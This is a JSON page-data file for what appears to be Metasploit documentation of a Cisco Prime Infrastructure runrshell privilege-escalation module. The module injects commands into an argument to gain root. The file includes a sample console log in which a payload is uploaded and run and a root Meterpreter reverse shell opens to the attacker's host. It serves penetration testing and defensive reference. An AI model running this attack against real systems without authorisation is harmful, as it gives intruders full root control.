{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/local/cpi_runrshell_priv_esc","result":{"data":{"moduleMetadataJson":{"id":"720c0c86-95f3-5837-acb7-0eb4e51f8d59","name":"Cisco Prime Infrastructure Runrshell Privilege Escalation","fullname":"exploit/linux/local/cpi_runrshell_priv_esc","description":"This modules exploits a vulnerability in Cisco Prime Infrastructure's runrshell binary. The\n        runrshell binary is meant to execute a shell script as root, but can be abused to inject\n        extra commands in the argument, allowing you to execute anything as root.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/local/cpi_runrshell_priv_esc","documentationSlug":"/modules/documentation/exploit/linux/local/cpi_runrshell_priv_esc","referencesSlug":"/modules/references/exploit/linux/local/cpi_runrshell_priv_esc"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This modules exploits a vulnerability in Cisco Prime Infrastructure's runrshell binary. The runrshell binary is meant to execute\na shell script as root, but can be abused to inject extra commands in the argument, allowing you to execute anything as root.\nIt was originally discovered by Pedro Ribeiro, and chained in the CVE-2018-15379 exploit.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(linux/local/cpi_runrshell_priv_esc) &gt; run\n\n[*] Started reverse TCP handler on 192.168.0.21:4444 \n[*] Uploading /tmp/mYVrqmsETa.bin\n[*] chmod the file with +x\n[*] Executing /tmp/mYVrqmsETa.bin\n[*] Sending stage (985320 bytes) to 192.168.0.23\n[*] Meterpreter session 4 opened (192.168.0.21:4444 -&gt; 192.168.0.23:55554) at 2019-06-10 11:18:13 -0500\n[+] Deleted /tmp/mYVrqmsETa.bin\n\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"720c0c86-95f3-5837-acb7-0eb4e51f8d59"}}}